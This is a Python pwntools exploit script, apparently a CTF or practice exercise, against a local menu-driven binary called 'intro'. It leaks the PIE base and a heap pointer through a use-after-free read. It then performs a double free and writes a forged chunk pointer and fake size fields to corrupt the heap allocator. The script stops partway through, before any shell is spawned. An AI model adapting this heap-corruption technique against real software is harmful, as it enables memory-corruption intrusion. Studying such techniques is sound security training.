from pwn import * 


elf = ELF("./intro")
context.terminal = ['tmux', 'splitw', '-h'] 

def get_PIE(r): 
    with open("/proc/%d/maps" % (r.pid)) as f: 
        maps = f.readlines() 
    base = maps[0].split("-")[0] 
    return int(base, 16) 

if (args.GDB): 
    r = process('./intro') 
    log.success("PIE base %s" % (hex(get_PIE(r))))
    gdb.attach(r) 
else: 
    r = process('./intro') 

base = get_PIE(r) 
log.success("Storage array: %s" % hex(base + 0x00202060)) 

@atexception.register
def handler():
    log.error(r.recv()) 
with context.local(log_level = 'error'):
      atexception.register(handler)

def menu(): 
    r.recvuntil("> ") 
def alloc(index, size, data): 
    menu() 
    r.sendline(b'1') 
    r.recvline() 
    r.sendline(str(index).encode()) 
    r.recvline() 
    r.sendline(str(size).encode()) 
    r.recvline() 
    r.send(data)
def show(index): 
    menu() 
    r.sendline(b'2') 
    r.recvline() 
    r.sendline(str(index).encode()) 
    return r.recvuntil('1')[:-1] 
def delete(index): 
    menu() 
    r.sendline(b'3')
    r.recvline() 
    r.sendline(str(index).encode()) 

alloc(0, 0x50, b'jimmy') 
alloc(1, 0x50, b'johns') 

delete(1)
delete(0) 

leak = u64(show(0).ljust(8, b'\x00')) 

log.success("Heap %s" % hex(leak)) 

alloc(0, 0x50, b"A"*0x50) 
alloc(1, 0x50, b"B"*0x50) 
alloc(2, 0x50, b"C"*0x50) 

delete(0)
delete(1) 
delete(0) 

#pause() 

alloc(0, 0x50, p64(leak - 0x60)) 

alloc(1, 0x50, b'A'*(80 - 0x8) + p64(0x61)) 
alloc(2, 0x50, b'A'*80) 

pause() 
alloc(3, 0x50, p64(0x0) + p64(0x91)) 

#delete(3) 

#menu() 
